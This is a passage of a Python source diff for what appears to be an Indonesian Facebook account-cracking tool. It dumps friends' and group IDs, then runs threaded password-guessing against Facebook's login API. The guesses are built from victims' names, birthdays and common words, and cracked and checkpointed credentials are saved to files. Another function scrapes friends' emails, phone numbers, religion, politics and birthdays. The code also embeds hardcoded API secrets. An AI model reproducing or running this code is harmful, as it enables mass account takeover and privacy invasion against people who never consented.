+                                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=sayang&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+                                                print('['+h+'OK'+k+'] > ' + user + ' | sayang')
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print('['+R+'CP'+k+'] > ' + user + ' | sayang')
+                                                else:
+
+                                                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=doraemon&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                    q = json.load(data)
+                                                    if 'access_token' in q:
+                                                        print('['+h+'OK'+k+'] > ' + user +' | doraemon')
+                                                    else:
+                                                        if 'www.facebook.com' in q['error_msg']:
+                                                            print('['+R+'CP'+k+'] > ' + user + ' | doraemon')
+                                                        else:
+                                                            y = json.loads(a.text)
+                                                            pass5 = y['first_name'] + '12'
+                                                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                            q = json.load(data)
+                                                            if 'access_token' in q:
+                                                                print('['+h+'OK'+k+'] > ' + user + ' | ' + pass5)
+                                                            else:
+                                                                if 'www.facebook.com' in q['error_msg']:
+                                                                    print('['+R+'CP'+k+'] > '+user+' | ' + pass5)
+                                                                else:
+                                                                    pass6 = y['last_name'] + '12'
+                                                                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                    q = json.load(data)
+                                                                    if 'access_token' in q:
+                                                                        print('['+h+'OK'+k+'] > ' + user + ' | ' + pass6)
+                                                                    else:
+                                                                        if 'www.facebook.com' in q['error_msg']:
+                                                                            print('['+R+'CP'+k+'] > ' + user + ' | ' + pass6)
+                                                                        else:
+                                                                            pass7 = 'anjing'
+                                                                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                            q = json.load(data)
+                                                                            if 'access_token' in q:
+                                                                                print('['+h+'OK'+k+'] > ' + user + ' | ' + pass7)
+                                                                            else:
+                                                                                if 'www.facebook.com' in q['error_msg']:
+                                                                                    print('['+R+'CP'+k+'] > ' + user + ' | ' + pass7)
+                                                                                else:
+                                                                                    pass8 = 'freefire'
+                                                                                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                    q = json.load(data)
+                                                                                    if 'access_token' in q:
+                                                                                        print('['+h+'OK'+k+'] > ' + user + ' | ' + pass8)
+                                                                                    else:
+                                                                                        if 'www.facebook.com' in q['error_msg']:
+                                                                                            print('['+R+'CP'+k+'] > ' + user + ' | ' + pass8)
+                                                                                        else:
+                                                                                            pass9 = 'bangsat'
+                                                                                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                            q = json.load(data)
+                                                                                            if 'access_token' in q:
+                                                                                                print('['+h+'OK'+k+'] > ' + user + ' | ' + pass9)
+                                                                                            else:
+                                                                                                if 'www.facebook.com' in q['error_msg']:
+                                                                                                    print('['+R+'CP'+k+'] > ' + user + ' | ' + paas9)
+        except:
+            pass
+    p = ThreadPool(30)
+    p.map(main, id)
+    print('[+] Succses')
+    input('[+] Press  [Enter] to return')
+    mbf()
+def idff():
+    try:
+        os.mkdir('dump')
+    except:
+        pass
+    try:
+        tik('[!] Loads access token....')
+        sleep(2)
+        toket = open('cookie/login.txt', 'r').read()
+        print('[+] Token found')
+    except IOError:
+        tik('[!] Token not found')
+        os.system('rm -rf cookie/login.txt')
+        input(R+'[!] Press [Enter] to new generate access token ')
+        logo()
+        print(t)
+        print(a)
+        toke()
+    else:
+        try:
+            print(a)
+            idt = input('[+] Enter friend ID : ')
+            try:
+                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+                op = json.loads(jok.text)
+                print('[+] ID Dari: ' + op['name'])
+            except KeyError:
+                print('[!] You have not been friends with ' + op['name'])
+                input('[+] Press [Enter] to return')
+                mbf()
+            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
+            z = json.loads(r.text)
+            save_idt = input("[?] Save file : ")
+            bz = open('dump/'+save_idt, 'w')
+            print('[+] Starting process....')
+            for ah in z['friends']['data']:
+                idb.append(ah['id'])
+                bz.write(ah['id'] + '\n')
+                print ('Name : ' + ah['name'])
+                print ('ID   : ' + ah['id'])
+            print('[+] Number of IDs :  ' + str(len(idb)))
+            print('[+] File saved    : output/' + save_idt)
+            bz.close()
+            input('[+] Press [Enter] to return')
+            mbf()
+        except KeyError:
+            print('[×] Anda Belum Berteman Dengan ' + op['name'])
+            input('[+] Press [Enter] to return ')
+            os.remove('save_idt')
+            mbf()
+        except (KeyboardInterrupt, EOFError):
+            print('[!] stopped')
+            input('[!] Press [Enter] to return ')
+            mbf()
+        except requests.exceptions.ConnectionError:
+            tik(r+'[!] Check Your Connection')
+            exit()
+        except IOError:
+            print('[!] Kesalahan saat membuat file')
+            input('[!] Press [Enter] to return ')
+            mbf()
+def teman():
+    global file
+    global idlist
+    global passw
+    try:
+        os.mkdir('output')
+    except:
+        pass
+    try:
+        tik('[+] Load access token....')
+        fail = open('cookie/login.txt', 'r').read()
+        print('[+] Token found')
+    except IOError:
+        tik(r+'[!] Token not found'+k)
+        os.system('rm -rf cookie/login.txt')
+        input('[!] Press [Enter] to generate access token ')
+        logo()
+        print(t)
+        print(a)
+        toke()
+    else:
+        print('')
+        idlist = input('[?] File ID   : ')
+        passw = input('[?] Password  : ')
+        try:
+            file = open(idlist, 'r')
+            tik('[!] Starting hacking......')
+            for x in range(40):
+                As = threading.Thread(target=scrak, args=())
+                As.start()
+                threads.append(As)
+            for As in threads:
+                As.join()
+        except IOError:
+            print('[!] File not found')
+            input('[+] Press [Enter] to return ')
+            os.system('clear')
+            logo()
+            print(s)
+            print(a)
+            mbf()
+def scrak():
+    global back
+    global berhasil
+    global cekpoint
+    global gagal
+    global up
+    try:
+        buka = open(idlist, 'r')
+        up = buka.read().split()
+        while file:
+            username = file.readline().strip()
+            url = 'https://b-api.facebook.com/method/auth.login?access_token=901418953537472%3eloTcOpO1Zkda0groyoEkTeuTI&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
+            data = urllib.request.urlopen(url)
+            mpsh = json.load(data)
+            if back == len(up):
+                break
+            if 'access_token' in mpsh:
+                bisa = open('output/live.txt', 'a')
+                bisa.write('ID dari : ' + idlist + '\n')
+                bisa.write(username + ' | ' + passw + '\n')
+                bisa.close()
+                berhasil.append('\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + username + ' | ' + passw)
+                back += 1
+            else:
+                if 'www.facebook.com' in mpsh['error_msg']:
+                    cek = open('output/Cekpoint.txt', 'a')
+                    cek.write('ID dari : ' + idlist + '\n')
+                    cek.write(username + ' | ' + passw + '\n')
+                    cek.close()
+                    cekpoint.append('\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + username + ' | ' + passw)
+                    back += 1
+                else:
+                    gagal.append(username)
+                    back += 1
+                    sys.stdout.write('\r[+] Searching Password : ' + passw + '\x1b[1;91m\x1b[1;97m ' + str(back) + '\x1b[1;96m>\x1b[1;97m' + str(len(up)) + '[Ok > ' + str(len(berhasil))+']' + '[Cp > ' + str(len(cekpoint))+']')
+                    sys.stdout.flush()
+    except IOError:
+        print ('\n[!] Koneksi terganggu')
+        sleep(0.0001)
+    except ConnectionError:
+        tik(R+'[!] Connection Error'+k)
+def token():
+        os.system('clear')
+        logo()
+        print(t)
+        print(a)
+        print('''  [ 01 ] Generate Access Token
+  [ 02 ] Remove Token
+  [ 03 ] Show Token
+  [ 00 ] Back
+  ''')
+        pilihan = input(n+'[#] Asmin' + k + '/' + n + 'Token' + k + '/' + n+'~'  + k + '> ')
+        if pilihan in ['']:
+            print(R'[!] Please Enter your choice')
+            input('[+] Press [Enter] to return'+k)
+            token()
+        elif pilihan in ['1','01']:
+            toke()
+        elif pilihan in ['2','02']:
+            hapus()
+        elif pilihan in ['3','03']:
+            try:
+                op = open('cookie/login.txt','r').read()
+                print('[>] Your Access Token : \n'+h+op)
+                print('')
+                input(k+'[!] Press [Enter] to return')
+                token()
+            except FileNotFoundError:
+                print("[!] You don't have token access yet")
+                input('[!] Press [Enter] to return')
+                token()
+        elif pilihan in ['0','00']:
+            os.system('clear')
+            sleep(0.7)
+            logo()
+            print(s)
+            print(a)
+            menu()
+        else:
+            tik(R+'[!] Wrong input')
+            input('[+] Press [Enter] to return'+k)
+            os.system('clear')
+            logo()
+            print(t)
+            print(a)
+            token()
+def toke():
+    try:
+        open('cookie/login.txt').read()
+        print(R+'[!] An access token already exists')
+        r = input(k+'[?] Are you sure want to continue [Y/N] : ')
+        if r.lower() == 'y' or r.upper() == 'Y':
+            toket()
+        else:
+            login()
+    except FileNotFoundError:
+        toket()
+def toket():
+    try:
+        os.mkdir('cookie')
+    except:
+        pass
+    try:
+        print(k+'['+R+'NOTE'+k+']'+h+' Before using this tools, please login in Opera Mini')
+        print(k+'[!] login to your facebook account first');id = input('[?] Username : '+h);pwd = getpass(k+'[?] Password : '+h);API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
+        x = hashlib.new('md5')
+        x.update(sig)
+        data.update({'sig':x.hexdigest()})
+        tik(k+'[!] Starting proses...')
+        requ=requests.get('https://api.facebook.com/restserver.php',params=data,headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'})
+        res=requ.json()['access_token']
+        o=open('cookie/login.txt','w')
+        o.write(res)
+        print(h+"[✔] success generate access token")
+        print(k+"[!] access token saved: cookie/login.txt")
+        o.close()
+        input(k+'[+] Press [Enter] to continue ')
+        login()
+    except KeyError:
+        print(R+"[!] failed generate access token")
+        print("[!] Check your username/password")
+        exit()
+    except (KeyboardInterrupt,EOFError):
+        exit("\n[!] Key interrupt: exit.")
+    except Exception as F:
+        exit("[Error] %s"%(F))
+    except requests.exceptions.ConnectionError:
+        print(R+'[!] Check Your Connection')
+def gruplist():
+    try:
+        os.mkdir('dump')
+    except:
+        pass
+    try:
+        tik('[+] Load Token...')
+        toket = open('cookie/login.txt', 'r').read()
+    except IOError:
+        print('[!] Token tidak ditemukan')
+        os.system('rm -rf cookie/login.txt')
+        sleep(1)
+        toke()
+    else:
+        print('[!] Start....')
+        print(a)
+        try:
+            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
+            gud = json.loads(uh.text)
+            for p in gud['data']:
+                nama = p['name']
+                id = p['id']
+                f = open('dump/grupid.txt', 'a')
+                listgrup.append(id)
+                f.write('Name : ' + nama + '\n')
+                f.write('ID   : ' + id + '\n')
+                print('[+] Name : ' + str(nama))
+                print('[+] ID   : ' + str(id))
+            print('[+] Totall %s:' % len(listgrup))
+            print('[+] Saved : dump/grupid.txt')
+            f.close()
+            input('[!] Press [Enter] to return')
+            mbf()
+        except (KeyboardInterrupt, EOFError):
+            print('[!] Stopped')
+            input('[+] Press [Enter] to return')
+            mbf()
+        except KeyError:
+            os.remove('grupid.txt')
+            print('[!] Group not found ')
+            input('[+] Press  [Enter] to return')
+            mbf()
+        except requests.exceptions.ConnectionError:
+            print(R+'[!] Check Your Connection')
+        except ConnectionError:
+            print(R+'[!] Connection Error')
+        except IOError:
+            print('[!] Kesalahan saat membuat file')
+            input('[+] Press [Enter] to back ')
+            mbf()
+def hapus():
+    print('['+r+'Warn'+k+'] You must generate access token next time')
+    v = input("[×] Type 'delete' to continue : ")
+    if v.lower() == 'delete':
+        try:
+            os.system('rm -rf cookie/login.txt')
+            tik('[+] Token successfully deleted')
+            input('[+] Press [Enter] to back ')
+            os.system('clear')
+            logo()
+            print(s)
+            menu()
+        except OSError:
+            tik(R+'[!] Failed deleted access token ')
+            input('[+] Press [Enter] to return'+k)
+            os.system('clear')
+            logo()
+            print(s)
+            print(a)
+            menu()
+    else:
+        print('[!] Failed to delete access token ')
+        input('[+] Press [Enter] to return'+k)
+        login()
+def info():
+    os.system('clear')
+    logo()
+    print('                 Friends Information')
+    print(a)
+    try:
+        print('[!] Load Token..')
+        sleep(2)
+        toket = open('cookie/login.txt', 'r').read()
+        tik('[+] Token Found')
+    except IOError:
+        print(R+'[!] Token Not Found')
+        os.system('rm -rf cookie/login.txt')
+        time.sleep(1)
+        toke()
+        login()
+    try:
+        let = input('[+] Input Name or ID : ')
+        if let == '':
+            tik('[+] Searching all friends information')
+        tik(n+'[+] Starting process...')
+        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+        cok = json.loads(r.text)
+        for p in cok['data']:
+            lol.append(p['id'])
+            if let in p['name'] or let in p['id']:
+                tik('[*] Searching...'+k)
+                print('')
+                x  = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
+                y = json.loads(x.text)
+                print(G + '     [-------- INFORMATION --------]' + k)
+                try:
+                    print('')
+                    print('[*] Id           :   '+p['id'])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] Username     :   '+y['username'])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] Email        :   '+y['email'])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] Mobile Phone :   '+y['mobile_phone'])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] Name         :   '+y['name'])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] First name   :   '+y['first_name'])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] Midle name   :   '+y['middle_name'])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] Last name    :   '+y['last_name'])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] Locale       :   '+y['locale'].split('_')[0])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] location     :   '+y['location']['name'])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] hometown     :   '+y['hometown']['name'])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] gender       :   '+y['gender'])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] religion     :   '+y['religion'])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] status       :   '+y['relationship_status'])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] political    :   '+y['political'])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] Work :')
+                    for i in y['work']:
+                        try:
+                            print('    position     : '+i['position']['name'])
+                        except KeyError:
+                            pass
+                        try:
+                            print('    employer     : '+i['employer']['name'])
+                        except KeyError:
+                            pass
+                        try:
+                            if i['start_date'] == "0000-00":
+                                print('    start date   : ---')
+                            else:
+                                print('    start date   :   '+i['start_date'])
+                        except KeyError:
+                            pass
+                        try:
+                            if i['end_date'] == "0000-00":
+                                print('    end date     : ---')
+                            else:
+                                print('    end date     :   '+i['end_date'])
+                        except KeyError:
+                            pass
+                        try:
+                            print('         location    :   '+i['location']['name'])
+                        except KeyError:
+                            pass
+                            print ('')
+                except KeyError:
+                    pass
+                try:
+                    print('[*] Updated time     :   '+y['updated_time'][:10]+' '+y['updated_time'][11:19])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] Languages    : ')
+                    for i in y['languages']:
+                        try:
+                            print(' ~  '+i['name'])
+                        except KeyError:
+                            pass
+                except KeyError:
+                    pass
+                try:
+                    print('[*] Bio          : '+y['bio'])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] quotes       : '+y['quotes'])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] birthday     : '+y['birthday'].replace('/','-'))
+                except KeyError:
+                    pass
+                try:
+                    print('[*] link         : '+y['link'])
+                except KeyError:
+                    pass
+                try:
+                    print('[*] Favourite teams  : ')
+                    for i in y['favorite_teams']:
+                        try:
+                            print(' ~  '+i['name'])
+                        except KeyError:
+                            pass
+                except KeyError:
+                    pass
+                try:
+                    print ('[*] School      : ')
+                    for i in y['education']:
+                        try:
+                            print(' ~  '+i['school']['name'])
+                        except KeyError:
+                            pass
+                except KeyError:
+                    pass
+                print('')
+                print (R+'[*] Done ')
+                print(k)
+        print('==========================')
+        print('')
+        input('[!] Press [Enter] To Return')
+        login()
+    except KeyError:
+        os.remove('cookie')
+        print('[!] Account has been Checkpoint ')
+        input('[!] Press [Enter] To Generate new access token')
+        toke()
+    except requests.exceptions.ConnectionError:
+        tik(R+'[!] No Connection ')
+    except KeyboardInterrupt:
+        exit()
+def tema():
+    try:
+        os.mkdir('result')
+    except:
+        pass
+    try:
+        tik('[! Loads access token..');sleep(2)
+        toket = open('cookie/login.txt','r').read()
+        print('[+] Token found')
+    except IOError:
+        print(R+'[!] Token Not Found')
+        os.remove('cookie/login.txt')
+        input('[Prees [Enter] To New Generate Access Token'+k)
+        toke()
+    r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
+    w = json.loads(r.text)
+    for s in w['data']:
+        id.append(s['id'])
+    print('[+]  ID : ' + str(len(id)))
+    tik('[!] Starting Crack...')
+    has = open('result/live','a')
+    def mos(arg):
+        try:
+                user = arg
+                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
+                b = json.loads(a.text)
+                pass1 = b['first_name'] + '123'
+                data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                q = json.load(data)
+                if 'access_token' in q:
+                    has.write(user+' | '+pass1)
+                    print('['+h+'OK'+k+'] > ' + user + ' | ' + pass1)
+                else:
+                    if 'www.facebook.com' in q['error_msg']:
+                        print('['+R+'CP'+k+'] > ' + user + ' | ' + pass1)
+                    else:
+                        pass2 = b['first_name'] + '12345'
+                        data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                        q = json.load(data)
+                        if 'access_token' in q:
+                            has.write(user+' | '+pass2)
+                            print('['+h+'OK'+k+'] > ' + user + ' | ' + pass2)
+                        else:
+                            if 'www.facebook.com' in q['error_msg']:
+                                print('['+R+'CP'+k+'] > ' + user + ' | ' + pass2)
+                            else:
+                                pass3 = b['last_name'] + '123'
+                                data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                q = json.load(data)
+                                if 'access_token' in q:
+                                    has.write(user+' | '+pass3)
+                                    print('['+h+'OK'+k+'] > ' + user + ' | ' + pass3)
+                                else:
+                                    if 'www.facebook.com' in q['error_msg']:
+                                        print('['+R+'CP'+k+'] > '+ user + ' | ' + pass3)
+                                    else:
+                                        lahir = b['birthday']
+                                        pass4 = lahir.replace('/', '')
+                                        data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                        q = json.load(data)
+                                        if 'access_token' in q:
+                                            has.write(user+' | '+pass5)
+                                            print('['+h+'OK'+k+'] > ' + user + ' | ' + pass4)
+                                        else:
+                                            if 'www.facebook.com' in q['error_msg']:
+                                                print('['+R+'CP'+k+'] > ' + user + ' | ' + pass4)
+                                            else:
+                                                data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=sayang&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                q = json.load(data)
+                                                if 'access_token' in q:
+                                                    has.write(user+' | sayang')
+                                                    print('['+h+'OK'+k+'] > ' + user + ' | sayang')
+                                                else:
+                                                    if 'www.facebook.com' in q['error_msg']:
+                                                        print('['+R+'CP'+k+'] > ' + user + ' | sayang')
+                                                    else:
+                                                        data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=cantik&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                        q = json.load(data)
+                                                        if 'access_token' in q:
+                                                            has.write(user+' | cantik\n')
+                                                            print('['+h+'OK'+k+'] > ' + user + ' | doraemon')
+                                                        else:
+                                                            if 'www.facebook.com' in q['error_msg']:
+                                                                print('['+R+'CP'+k+'] > ' + user + ' | doraemon')
+                                                            else:
+                                                                pass5 = b['name'] + '123'
+                                                                data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                q = json.load(data)
+                                                                if 'access_token' in q:
+                                                                    has.write(user+' | '+pass5)
+                                                                    print('['+h+'OK'+k+'] > ' + user + ' | ' + pass5)
+                                                                else:
+                                                                    if 'www.facebook.com' in q['error_msg']:
+                                                                        print('['+R+'CP'+k+'] > ' + user + ' | ' + pass5)
+                                                                    else:
+                                                                        pass6 = b['name'].lower()
+                                                                        data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                        q = json.load(data)
+                                                                        if 'access_token' in q:
+                                                                            has.write(user+' | '+pass6)
+                                                                            print('['+h+'OK'+k+'] > ' + user + ' | ' + pass6)
+                                                                        else:
+                                                                            if 'www.facebook.com' in q['error_msg']:
+                                                                                print('['+R+'CP'+k+'] > '+ user + ' | ' + pass6)
+                                                                            else:
+                                                                                pass7 = b['first_name'] + '12'
+                                                                                data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                q = json.load(data)
+                                                                                if 'access_token' in q:
+                                                                                    has.write(user+' | '+pass7)
+                                                                                    print('['+h+'OK'+k+'] > ' + user + ' | ' + pass7)
+                                                                                else:
+                                                                                    if 'www.facebook.com' in q['error_msg']:
+                                                                                        print('['+R+'CP'+k+'] > '+user+' | ' + pass7)
+                                                                                    else:
+                                                                                        pass8 = b['first_name'] + '12'
+                                                                                        data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                        q = json.load(data)
+                                                                                        if 'access_token' in q:
+                                                                                            has.write(user+' | '+pass8)
+                                                                                            print('['+h+'OK'+k+'] > ' + user + ' | ' + pass8)
+                                                                                        else:
+                                                                                            if 'www.facebook.com' in q['error_msg']:
+                                                                                                print('['+R+'CP'+k+'] > ' + user + ' | ' + pass8)
+                                                                                            else:
+                                                                                                pass9 = b['first_name'] + '12'
+                                                                                                data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                                q = json.load(data)
+                                                                                                if 'access_token' in q:
+                                                                                                    has.write(user+' | '+pass9)
+                                                                                                    has.close()
+                                                                                                    print('['+h+'OK'+k+'] > ' + user + ' | ' + pass9)
+                                                                                                else:
+                                                                                                    if 'www.facebook.com' in q['error_msg']:
+                                                                                                        print('['+R+'CP'+k+'] > '+ user + ' | ' + pass9)
+        except:
+            pass
+    p =  ThreadPool(30)
+    p.map(mos, id)
+    print('[+] Finish')
+    input('[+] Press [Enter] to return')
+    mbf()
+def ff():
+    try:
+        os.mkdir('results')
+    except:
+        pass
+    try:
+        tik ('[*] Load access token..')
+        sleep(2)
+        toket = open("cookie/login.txt",'r').read()
+        print ('[*] Token found')
+    except IOError:
+        tik('[!] Token not found')
+        os.remove('cookie/login.txt')
+        toke()
+
+    idt = input(n+'[+] Enter ID     : '+k)
+    try:
+        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+        op = json.loads(jok.text)
+        print('[+] ID from      : ' + op['name'])
+    except KeyError:
+        print('[!] Anda Belum Berteman Dengan' + op['name'])
+        input('[+] Tekan [Enter] Untuk Kembali ')
+    except requests.exceptions.ConnectionError:
+        tik(R+'[!] Check your connection')
+        exit()
+    re = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
+    s = json.loads(re.text)
+    for i in s['friends']['data']:
+        ibb.append(i['id'])
+    print('[+] Jumlah ID : ' + str(len(ibb)))
+    tik('[!] Starting Crack...')
+    def lef(arg):
+        user = arg
+        try:
+
+            s = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
+            b = json.loads(s.text)
+            pass1 = b['first_name'] + '123'
+            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+            q = json.load(data)
+            if 'access_token' in q:
+                print('['+h+'OK'+k+'] > ' + user + ' | ' + pass1)
+
+            else:
+                if 'www.facebook.com' in q['error_msg']:
+                    print('['+R+'CP'+k+'] > ' + user + ' | ' + pass1)
+                else:
+                    pass2 = b['first_name'] + '12345'
+                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    q = json.load(data)
+                    if 'access_token' in q:
+
+                        print('['+h+'OK'+k+'] > ' + user + ' | ' + pass2)
+                    else:
+                        if 'www.facebook.com' in q['error_msg']:
+                            print('['+R+'CP'+k+'] > '+ user + ' | ' + pass2)
+                        else:
+                            pass3 = b['last_name'] + '123'
+                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                            q = json.load(data)
+                            if 'access_token' in q:
+
+                                print('['+h+'OK'+k+'] > ' + user + ' | ' + pass3)
+                            else:
+                                if 'www.facebook.com' in q['error_msg']:
+                                    print('['+R+'CP'+k+'] > '+ user + ' | ' + pass3)
+                                else:
+                                    lahir = b['birthday']
+                                    pass4 = lahir.replace('/', '')
